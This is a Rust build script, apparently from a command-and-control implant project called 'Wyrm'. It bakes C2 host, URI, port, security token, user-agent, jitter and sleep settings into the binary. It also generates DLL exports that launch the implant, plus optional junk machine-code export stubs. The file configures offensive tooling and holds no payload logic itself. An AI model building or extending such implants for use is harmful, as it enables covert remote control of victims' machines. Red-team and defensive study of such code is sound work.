use std::{env, fmt::Write, fs, path::PathBuf};

fn main() {
    let envs = &[
        "DEF_SLEEP_TIME",
        "C2_HOST",
        "C2_URIS",
        "C2_PORT",
        "SECURITY_TOKEN",
        "USERAGENT",
        "AGENT_NAME",
        "JITTER",
        "EXPORTS_JMP_WYRM",
        "EXPORTS_USR_MACHINE_CODE",
    ];

    for key in envs {
        println!("cargo:rerun-if-env-changed={key}");
    }

    for var in envs {
        if let Ok(val) = env::var(var) {
            println!("cargo:rustc-env={var}={val}");
        }
    }

    write_exports_to_build_dir();
}

fn write_exports_to_build_dir() {
    let out_dir = PathBuf::from(env::var("OUT_DIR").unwrap());
    let dest = out_dir.join("custom_exports.rs");
    let mut code = String::new();

    let exports_usr_machine_code = option_env!("EXPORTS_USR_MACHINE_CODE");
    let exports_jmp_wyrm = option_env!("EXPORTS_JMP_WYRM");

    if let Some(export_str) = exports_jmp_wyrm {
        if export_str.is_empty() {
            // If there was no custom export defined, then we just export the 'run' extern
            writeln!(&mut code, "build_dll_export_by_name_start_wyrm!(run);",).unwrap();
        }

        for fn_name in export_str.split(';').filter(|s| !s.trim().is_empty()) {
            writeln!(
                &mut code,
                "build_dll_export_by_name_start_wyrm!({fn_name});",
            )
            .unwrap();
        }
    } else {
        // Just in case.. we still need an entrypoint, tho this should never run
        writeln!(&mut code, "build_dll_export_by_name_start_wyrm!(run);",).unwrap();
    }

    if let Some(export_str) = exports_usr_machine_code {
        for item in export_str.split(';').filter(|s| !s.trim().is_empty()) {
            let mut parts = item.split('=');
            let name = parts.next().unwrap().trim();
            let bytes = parts.next().unwrap_or("").trim();

            assert!(!name.is_empty());
            assert!(!bytes.is_empty());

            writeln!(
                &mut code,
                "build_dll_export_by_name_junk_machine_code!({name}, {bytes});",
            )
            .unwrap();
        }
    }

    // We still need to write in the case of nothing so that we dont get include
    // errors
    fs::write(dest, code).unwrap();
}
